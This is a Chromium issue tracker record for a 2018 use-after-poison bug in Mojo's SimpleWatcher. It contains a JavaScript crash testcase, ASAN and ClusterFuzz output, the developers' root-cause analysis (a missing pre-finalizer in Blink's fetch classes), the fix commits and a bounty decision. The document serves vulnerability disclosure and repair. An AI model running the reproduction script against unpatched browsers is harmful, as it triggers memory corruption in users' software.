# Security: use-after-poison in mojo::SimpleWatcher::OnHandleReady

| Field | Value |
|-------|-------|
| **Issue ID** | [40093088](https://issues.chromium.org/issues/40093088) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Core, Internals>Mojo |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | wa...@chromium.org |
| **Created** | 2018-11-16 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell. It might require a few reloads.

**VERSION**  

Chrome Version: asan-linux-release-608443  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o14=window.document;
window.top.setTimeout(fun0, 4);
}
function fun0() {
o116=document.createElementNS('http://www.w3.org/1999/xhtml','th');
o124=document.createElementNS('http://www.w3.org/2000/svg','feConvolveMatrix');
o182=document.createElementNS('http://www.w3.org/1999/xhtml','frameset');
o368=o116.prepend(undefined,o124,undefined);
document.documentElement.innerHTML=unescape('%3E');
o124.insertAdjacentHTML('afterend','<iframe src="javascript:window.top.fun1()">');
o1187=new Blob(undefined);
o1226=new Response(o1187);
document.documentElement.appendChild(o116);
}
function fun1() {
o1341=o1226.arrayBuffer();
o14.write('<html><body><div></div><div></div></body></html>');
o1472=new Float32Array(536870912);
window.top.document.body=o182;
document.documentElement.ownerDocument.location.hash='#id14';
location.reload();
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Crash State:

=================================================================  

==18396==ERROR: AddressSanitizer: use-after-poison on address 0x7ef6aed19f9c at pc 0x557eb59b77cf bp 0x7fff61e409f0 sp 0x7fff61e409e8  

READ of size 4 at 0x7ef6aed19f9c thread T0 (content\_shell)  

#0 0x557eb59b77ce in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple\_watcher.cc:256:19  

#1 0x557eb573050e in Run base/callback.h:99:12  

#2 0x557eb573050e in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#3 0x557eb582f688 in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:209:23  

#4 0x557eb573050e in Run base/callback.h:99:12  

#5 0x557eb573050e in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#6 0x557eb572de87 in base::MessageLoopImpl::RunTask(base::PendingTask\*) base/message\_loop/message\_loop\_impl.cc:469:46  

#7 0x557eb572ece7 in DeferOrRunPendingTask base/message\_loop/message\_loop\_impl.cc:480:5  

#8 0x557eb572ece7 in base::MessageLoopImpl::DoWork() base/message\_loop/message\_loop\_impl.cc:568  

#9 0x557eb5735ecf in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:31  

#10 0x557eb57a9e5b in base::RunLoop::Run() base/run\_loop.cc:102:14  

#11 0x557ec2fcf53e in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:202:16  

#12 0x557eb2f485e5 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:495:14  

#13 0x557eb2f4c1c5 in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:906:10  

#14 0x557ebace73b4 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:472:29  

#15 0x557eb0414b6c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#16 0x557ead89fcb7 in main content/shell/app/shell\_main.cc:39:10  

#17 0x7f2570a96b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

Address 0x7ef6aed19f9c is a wild pointer.  

SUMMARY: AddressSanitizer: use-after-poison mojo/public/cpp/system/simple\_watcher.cc:256:19 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)  

Shadow bytes around the buggy address:  

0x0fdf55d9b3a0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdf55d9b3b0: f7 f7 f7 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdf55d9b3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdf55d9b3d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdf55d9b3e0: 00 00 00 00 00 00 00 00 00 00 00 f7 f7 f7 f7 f7  

=>0x0fdf55d9b3f0: f7 f7 f7[f7]f7 f7 f7 f7 f7 f7 f7 f7 f7 00 00 00  

0x0fdf55d9b400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdf55d9b410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdf55d9b420: 00 f7 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdf55d9b430: 00 00 00 00 00 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdf55d9b440: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==18396==ABORTING

## Timeline

### dr...@chromium.org (2018-11-16)

Was able to reproduce for ASAN Chrome on Linux, so uploading to ClusterFuzz for further analysis.

### cl...@chromium.org (2018-11-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5101307586936832.

### cl...@chromium.org (2018-11-16)

Testcase 5101307586936832 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5101307586936832.

### dr...@chromium.org (2018-11-20)

I'm not sure why ClusterFuzz fails to reproduce this, it works fairly consistently in a local build. I didn't see anything useful in the stack trace. Logging the creation and destruction of SimpleWatchers, the SimpleWatcher that "causes" the use-after-poison was never destroyed. Combining this fact with the line "Address 0x7ef6aed19f9c is a wild pointer.", I'm inclined to think this has nothing to do with SimpleWatcher. But I have no leads as to what is causing this.

### cl...@chromium.org (2018-11-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5452463022538752.

### cl...@chromium.org (2018-11-21)

Detailed report: https://clusterfuzz.com/testcase?key=5452463022538752

Job Type: linux_asan_content_shell_drt
Platform Id: linux

Crash Type: Use-after-poison READ 4
Crash Address: 0x7ebb781bcff4
Crash State:
  mojo::SimpleWatcher::OnHandleReady
  base::debug::TaskAnnotator::RunTask
  base::sequence_manager::internal::ThreadControllerImpl::DoWork
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=606777:606778

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5452463022538752

See https://github.com/google/clusterfuzz-tools for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### cl...@chromium.org (2018-11-21)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Core Internals>Mojo]

### cl...@chromium.org (2018-11-21)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/chromium/src/+/9453dfbffd2000b3eafab2a59169da733d8cf08a (Revert "Enable unified garbage collections part two").

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### ph...@chromium.org (2018-11-21)

The CL could well be the culprit, but it's a revert of mlippautz' patch, so I don't know how to handle this...?

### ml...@chromium.org (2018-11-21)

My CL was reverting a feature that went for a test run.

This looks like it is not even related to Blink or V8 garbage collection, so it should not even affect this case except for timing.

### sh...@chromium.org (2018-11-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-21)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-11-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-21)

This issue is marked as a release blocker with no OS labels associated. Please add an appropriate OS label.

All release blocking issues should have OS labels associated to it, so that the issue can tracked and promptly verified, once it gets fixed.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-11-26)

This issue is marked as a release blocker with no OS labels associated. Please add an appropriate OS label.

All release blocking issues should have OS labels associated to it, so that the issue can tracked and promptly verified, once it gets fixed.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2018-11-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-11-28)

Detailed report: https://clusterfuzz.com/testcase?key=5452463022538752

Job Type: linux_asan_content_shell_drt
Platform Id: linux

Crash Type: Use-after-poison READ 4
Crash Address: 0x7ebb781bcff4
Crash State:
  mojo::SimpleWatcher::OnHandleReady
  base::debug::TaskAnnotator::RunTask
  base::sequence_manager::internal::ThreadControllerImpl::DoWork
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=606777:606778

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5452463022538752

See https://github.com/google/clusterfuzz-tools for more information.

### ct...@chromium.org (2018-12-02)

From the stack trace, assigning to rockot@ and cc'ing gab@ and altimin@. Could you please take a look?

### ro...@google.com (2018-12-02)

This pretty much always means someone is failing to close an InterfacePtr during GC disposal. Impossible to tell which code is doing this from the stack trace though.

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-12-12)

ClusterFuzz has detected this issue as fixed in range 615873:615874.

Detailed report: https://clusterfuzz.com/testcase?key=5452463022538752

Job Type: linux_asan_content_shell_drt
Platform Id: linux

Crash Type: Use-after-poison READ 4
Crash Address: 0x7ebb781bcff4
Crash State:
  mojo::SimpleWatcher::OnHandleReady
  base::debug::TaskAnnotator::RunTask
  base::sequence_manager::internal::ThreadControllerImpl::DoWork
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=606777:606778
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=615873:615874

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5452463022538752

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-12-12)

ClusterFuzz testcase 5452463022538752 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-12-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-15)

This bug requires manual review: M72 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), djmm@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-12-17)

+ awhalley@ (Security TPM) for M72 merge review, not seeing any cl here. Thank you.

### ab...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### ro...@google.com (2018-12-17)

Don't know what actually landed to fix this, FWIW.

### aw...@google.com (2018-12-17)

The only change in the fix range is: https://chromium.googlesource.com/chromium/src/+/cf9f80b0a223258d1583a664bbeb9f4501330df5 which doesn't seem relevent.


### cl...@chromium.org (2018-12-17)

Detailed report: https://clusterfuzz.com/testcase?key=5452463022538752

Job Type: linux_asan_content_shell_drt
Platform Id: linux

Crash Type: Use-after-poison READ 4
Crash Address: 0x7ebb781bcff4
Crash State:
  mojo::SimpleWatcher::OnHandleReady
  base::debug::TaskAnnotator::RunTask
  base::sequence_manager::internal::ThreadControllerImpl::DoWork
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=606777:606778

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5452463022538752

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

### aw...@google.com (2018-12-17)

Yea, clusterfuzz things it's still reproducing - flaky test case I suspect.

### ro...@google.com (2018-12-17)

Ah yep. It's repro'ing for me on ToT consistently now.

### ga...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### ro...@google.com (2018-12-17)

With a little bit of hacking I've found that the definitive culprit is Blink fetch's DataPipeBytesConsumer[1]. Over to yhirano@ as the author.

Based on a discussion with reillyg@ it seems like this object will need a pre-finalizer[2] to call watcher_.Cancel(). It is not sufficient that the callback given to SimpleWatcher binds to a persistent |this| reference, because SimpleWatcher::ArmOrNotify uses PostTask internally, constraining callback lifetime via a WeakPtrFactory it owns.

We may want a dedicated Blink type to replace SimpleWatcher since this is super subtle and bound to happen again.

[1] https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fetch/data_pipe_bytes_consumer.h?rcl=5f2f89d78b5c2b0e9f91bf760fbe8df7788e2aa6&l=76
[2] https://cs.chromium.org/chromium/src/third_party/blink/renderer/modules/webusb/usb.h?rcl=e98039d222ec63c6cc76600f7bccbbb8ff8c1dc3&l=31

### ro...@google.com (2018-12-17)

Actually the ArmOrNotify detail is irrelevant, so you can ignore that. SimpleWatcher always posts its notification task using a self weakptr, and so its use by GCed types will always be problematic if not disposed of properly.

In any case, this seems quite surprising to me, because I would expect a GarbageCollectedFinalized object to have its destructor run before any poisoning happens.

### ha...@chromium.org (2018-12-18)

> It is not sufficient that the callback given to SimpleWatcher binds to a persistent |this| reference, because SimpleWatcher::ArmOrNotify uses PostTask internally, constraining callback lifetime via a WeakPtrFactory it owns.

Would you elaborate on this a bit more? Why is it not sufficient to use WrapPersistent?

> In any case, this seems quite surprising to me, because I would expect a GarbageCollectedFinalized object to have its destructor run before any poisoning happens.

We intentionally poison unmarked objects immediately after finishing marking (before destruction starts) because it is anyway unsafe to touch unmarked objects after that point. Note that destructions may happen in any arbitrary order. If you touch unmarked objects after that point, the objects may have been already destructed.



### yh...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### wa...@google.com (2018-12-18)

I'll take a look at adding the explicit Cancel() call in the morning.  Sorry for the difficulties.

### wa...@chromium.org (2018-12-18)

Would another option be to mark the object as eager finalized?

### ro...@google.com (2018-12-18)

Re #36: WrapPersistent is not sufficient because it's only used by the consumer of SimpleWatcher, but SimpleWatcher internally post tasks for itself. See for example [1] and [2].

Because Mojo obviously isn't going to use WrapPersistent internally, the persistent reference will only remain valid until the SimpleWatcher is Cancel()ed and the user-provided callback_ is reset within SimpleWatcher. So I assume that must be what happens. 

And note that while Cancel() does guarantee that no future tasks will be posted by SimpleWatcher, one may have already been posted just before Cancel() call, and it will still run as long as the WeakPtrFactory remains valid.

So, regarding #38, upon further reflection adding the Cancel() alone will not be sufficient. You could add it, but you'd also have to add a call to InvalidateWeakPtrs on the SimpleWatcher's WeakPtrFactory within Cancel(). That's probably a good idea anyway. The other option would be to just use a std::unique_ptr<SimpleWatcher> or base::Optional<SimpleWatcher> and reset it on pre-finalize.

Not sure about eager finalization, that's probably a question for haraken@.

[1] https://cs.chromium.org/chromium/src/mojo/public/cpp/system/simple_watcher.cc?rcl=4e7dcd7a9c4894024bf2fdcc061ca2acda4931a2&l=120
[2] https://cs.chromium.org/chromium/src/mojo/public/cpp/system/simple_watcher.cc?rcl=4e7dcd7a9c4894024bf2fdcc061ca2acda4931a2&l=257

### ha...@chromium.org (2018-12-18)

My suggestion would be:

- Make DataPipeBytesConsumer call SimpleWatcher::Cancel() (or Reset()?) in a pre-finalizer.
- Make SimpleWatcher stop invoking any callback after Cancel()ed.

Will it work?

It looks strange if SimpleWatcher keeps invoking callbacks even after Cancel()ed.


### wa...@chromium.org (2018-12-18)

I'll go with the pre-finalizer since the oilpan design says there is a desire to remove eagerly-finalized:

https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/heap/BlinkGCDesign.md?l=84-140&rcl=6440952598da58b100bfd274207abd0af4d6e2d8

I'll also try to add the WeakPtr invalidation in SimpleWatcher::Cancel() as that seems the most correct based on its current documentation.

I'll also add some documentation to SimpleWatcher noting that Cancel() should be called from a pre-finalizer if used in an oilpan object.  Is there any kind of static analysis which could further help prevent this footgun?

### ro...@google.com (2018-12-18)

Keep in mind that SimpleWatcher is already correct according to its
documentation. While a latent OnHandkeReady task may still run after
Cancel, the user's callback will not.

This is *only* an issue because of GC behavior.

On Tue, Dec 18, 2018, 6:18 AM wanderview via monorail <
monorail+v2.575285220@chromium.org wrote:

### sh...@chromium.org (2018-12-18)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### wa...@chromium.org (2018-12-18)

Ah, I see.  Sorry for my confusion.

### wa...@chromium.org (2018-12-18)

Actually, since this is a security bug in release, I guess I should leave out explanatory documentation for now so people can't see it in the CL, etc?  I'm not sure about the process for that in chrome as this is the first critical security bug I've worked.

### ro...@google.com (2018-12-18)

I don't think there's any static analysis that will solve this. We probably should just have a GC-friendly handle-watching thing defined by Blink instead of using SimpleWatcher there.

I think adding documentation that refers to Blink GC will only confuse readers. This is not something we should ask people to think about. For example, we don't have similar documentation for WeakPtrFactory or base::Bind* methods, because they aren't designed to work in an environment where something can poison them without destroying them.

It's unfortunate that this happened, but also totally understandable. But the right solution long-term is probably just to build something better.

### ro...@google.com (2018-12-18)

Yeah, generally for anything that will require a merge, smaller patch = better :)

### wa...@chromium.org (2018-12-18)

https://chromium-review.googlesource.com/c/chromium/src/+/1382692

### wa...@chromium.org (2018-12-18)

I briefly audited some other SimpleWatcher uses in blink (cs search for "file:blink SimpleWatcher").  This is the only other one that looks suspect to me:

https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fetch/fetch_data_loader.cc?l=623&rcl=c4580946bcf136a5e156c12d91d25d11dc05a8b8

It should probably also have a pre-finalizer that calls data_pipe_watcher_.Cancel().  I'll update the CL to include that.

### cl...@chromium.org (2018-12-18)

ClusterFuzz has detected this issue as fixed in range 617189:617191.

Detailed report: https://clusterfuzz.com/testcase?key=5452463022538752

Job Type: linux_asan_content_shell_drt
Platform Id: linux

Crash Type: Use-after-poison READ 4
Crash Address: 0x7ebb781bcff4
Crash State:
  mojo::SimpleWatcher::OnHandleReady
  base::debug::TaskAnnotator::RunTask
  base::sequence_manager::internal::ThreadControllerImpl::DoWork
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=606777:606778
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell_drt&range=617189:617191

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5452463022538752

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### ro...@google.com (2018-12-18)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-12-19)

I'd add that all mojo bindings are hitting a similar problem. We're now using pre-finalizer or RevokableBinding to reset bindings manually...


### wa...@chromium.org (2018-12-19)

It's end of day for me, but if the CL passes review without needing modification please submit it to CQ for me.  Thanks!

### bu...@chromium.org (2018-12-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6a85d33f37ac4eb9603092cfd1a608bddd87506b

commit 6a85d33f37ac4eb9603092cfd1a608bddd87506b
Author: Ben Kelly <wanderview@chromium.org>
Date: Wed Dec 19 04:03:11 2018

Cancel SimpleWatcher from a pre-finalizer in core/fetch classes.

Bug: 905975
Change-Id: I6ad571951c0a6a8049a5df3f8142770709234500
Reviewed-on: https://chromium-review.googlesource.com/c/1382692
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Ken Rockot <rockot@google.com>
Cr-Commit-Position: refs/heads/master@{#617721}
[modify] https://crrev.com/6a85d33f37ac4eb9603092cfd1a608bddd87506b/mojo/public/cpp/system/simple_watcher.cc
[modify] https://crrev.com/6a85d33f37ac4eb9603092cfd1a608bddd87506b/third_party/blink/renderer/core/fetch/data_pipe_bytes_consumer.cc
[modify] https://crrev.com/6a85d33f37ac4eb9603092cfd1a608bddd87506b/third_party/blink/renderer/core/fetch/data_pipe_bytes_consumer.h
[modify] https://crrev.com/6a85d33f37ac4eb9603092cfd1a608bddd87506b/third_party/blink/renderer/core/fetch/fetch_data_loader.cc


### wa...@chromium.org (2018-12-20)

This is now in canary 73.0.3646.0.  Per https://crbug.com/chromium/905975#c51, though, clusterfuzz already thought the issue was fixed.  Do we have any other way to verify this fix before requesting a merge?

### wa...@chromium.org (2018-12-21)

drubery@ are you able to reproduce with latest canary?

Also, this is marked m-73, but the DataPipeBytesConsumer is in 71.  Is there some difference in oilpan that makes this only affect 73 or should we merge it up to 71?

### wa...@chromium.org (2019-01-02)

I'm going to mark this fixed, but I'm a bit unsure if this should be merged to 71/72.  The patch is pretty small, but mojo SimpleWatcher is core infrastructure and I worry about unexpected effects from that change.

### aw...@google.com (2019-01-02)

Thanks wanderview@.

Requesting merge to M72, this has been in canary for two weeks at this point and while that was over the holidays, that should be enough time for any major issues to have surfaced.

### wa...@chromium.org (2019-01-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-02)

This bug requires manual review: M72 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), djmm@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2019-01-02)

Approving merge to M72 branch 3626 based on https://crbug.com/chromium/905975#c59. Please merge ASAP.

### bu...@chromium.org (2019-01-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b48df88afdd924abcec89d31c84a46c408e26592

commit b48df88afdd924abcec89d31c84a46c408e26592
Author: Ben Kelly <wanderview@chromium.org>
Date: Wed Jan 02 18:37:04 2019

Cancel SimpleWatcher from a pre-finalizer in core/fetch classes.

Bug: 905975
Change-Id: I6ad571951c0a6a8049a5df3f8142770709234500
Reviewed-on: https://chromium-review.googlesource.com/c/1382692
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Ken Rockot <rockot@google.com>
Cr-Original-Commit-Position: refs/heads/master@{#617721}(cherry picked from commit 6a85d33f37ac4eb9603092cfd1a608bddd87506b)
Reviewed-on: https://chromium-review.googlesource.com/c/1393018
Reviewed-by: Ben Kelly <wanderview@chromium.org>
Cr-Commit-Position: refs/branch-heads/3626@{#537}
Cr-Branched-From: d897fb137fbaaa9355c0c93124cc048824eb1e65-refs/heads/master@{#612437}
[modify] https://crrev.com/b48df88afdd924abcec89d31c84a46c408e26592/mojo/public/cpp/system/simple_watcher.cc
[modify] https://crrev.com/b48df88afdd924abcec89d31c84a46c408e26592/third_party/blink/renderer/core/fetch/data_pipe_bytes_consumer.cc
[modify] https://crrev.com/b48df88afdd924abcec89d31c84a46c408e26592/third_party/blink/renderer/core/fetch/data_pipe_bytes_consumer.h
[modify] https://crrev.com/b48df88afdd924abcec89d31c84a46c408e26592/third_party/blink/renderer/core/fetch/fetch_data_loader.cc


### cr...@appspot.gserviceaccount.com (2019-01-02)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/b48df88afdd924abcec89d31c84a46c408e26592

Commit: b48df88afdd924abcec89d31c84a46c408e26592
Author: wanderview@chromium.org
Commiter: wanderview@chromium.org
Date: 2019-01-02 18:37:04 +0000 UTC

Cancel SimpleWatcher from a pre-finalizer in core/fetch classes.

Bug: 905975
Change-Id: I6ad571951c0a6a8049a5df3f8142770709234500
Reviewed-on: https://chromium-review.googlesource.com/c/1382692
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Ken Rockot <rockot@google.com>
Cr-Original-Commit-Position: refs/heads/master@{#617721}(cherry picked from commit 6a85d33f37ac4eb9603092cfd1a608bddd87506b)
Reviewed-on: https://chromium-review.googlesource.com/c/1393018
Reviewed-by: Ben Kelly <wanderview@chromium.org>
Cr-Commit-Position: refs/branch-heads/3626@{#537}
Cr-Branched-From: d897fb137fbaaa9355c0c93124cc048824eb1e65-refs/heads/master@{#612437}

### na...@google.com (2019-01-07)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-10)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### pa...@chromium.org (2019-01-10)

Thanks for your report. The panel has decided to reward $3,000 :) 

### na...@google.com (2019-01-10)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-15)

[Empty comment from Monorail migration]

### yh...@chromium.org (2019-03-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/905975?no_tracker_redirect=1

[Multiple monorail components: Internals>Core, Internals>Mojo]
[Monorail mergedwith: crbug.com/chromium/915345]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093088)*
